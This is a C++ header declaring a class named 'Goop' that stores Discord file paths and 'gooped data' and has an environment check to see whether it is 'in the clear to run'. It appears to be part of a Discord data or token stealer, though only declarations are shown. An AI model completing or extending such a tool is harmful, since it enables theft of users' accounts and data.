#pragma once
#include <unordered_map>

#include "config.h"

class Goop {
public:
	Goop() noexcept;

	bool GetStatus() noexcept;

	std::string GetGoopedData() noexcept;

private:
	//Stored data
	umss			umssPaths;
	vs				vsDiscordPaths;
	std::string		sGoopedData;

	bool ValidateEnvironment() noexcept; //Does various validation checks to see if we're in the clear to run the program

	void LoadPaths() noexcept; //Loads the paths that we are going to use
};